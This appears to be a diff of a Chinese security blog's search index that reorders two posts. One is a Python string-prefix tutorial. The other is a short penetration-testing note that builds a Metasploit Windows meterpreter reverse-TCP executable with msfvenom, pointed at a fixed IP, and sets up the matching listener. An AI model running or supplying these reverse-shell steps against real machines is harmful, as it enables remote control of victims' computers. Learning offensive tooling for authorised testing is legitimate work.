@@ -718,6 +718,23 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>msf的shell在windows中的利用</title>
+    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>msf的shell的制作</p>
+<a id="more"></a>
+<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
+<p>输入命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf shell制作</category>
+      </categories>
+  </entry>
+  <entry>
     <title>记一题php$$变量覆盖</title>
     <url>/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
     <content><![CDATA[<p>彻底学一下$$变量覆盖</p>
@@ -761,23 +778,6 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>msf的shell在windows中的利用</title>
-    <url>/2020/12/20/msfvenom%E7%9A%84shell%E5%9C%A8windows%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>msf的shell的制作</p>
-<a id="more"></a>
-<h3 id="msfvenom生成shell-exe"><a class="header-anchor" href="#msfvenom生成shell-exe">¶</a><strong>msfvenom生成shell.exe</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;222.222.221.140 lport&#x3D;1211 -f exe &gt; &#x2F;root&#x2F;shell.exe</span><br></pre></td></tr></table></figure>
-<h3 id="启动metasploit"><a class="header-anchor" href="#启动metasploit">¶</a>启动metasploit</h3>
-<p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="metasploit侦听"><a class="header-anchor" href="#metasploit侦听">¶</a><strong>metasploit侦听</strong></h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler     #加载模块</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp    #设置payload</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lhost kali的ip   #设置kali的ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set lport 1211   #设置kali的端口</span><br><span class="line">lport &#x3D;&gt; 1211</span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit   #执行</span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211 </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf shell制作</category>
       </categories>
   </entry>
   <entry>
@@ -845,6 +845,27 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>eval与assert</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
       </categories>
   </entry>
   <entry>
@@ -1079,27 +1100,6 @@ file -f:报错出具体内容</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
-字符串中存在中文的字符，在前面加上u</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
-<p><strong>2.r:表示非转义的原始字符串</strong><br>
-字符串中存在\，要让它失效，要在前面加上r</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
-<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
-<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
-<p>下面看下 f-strings 的使用方法</p>
-<p>基本使用（作用：替换值）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
       </categories>
   </entry>
   <entry>
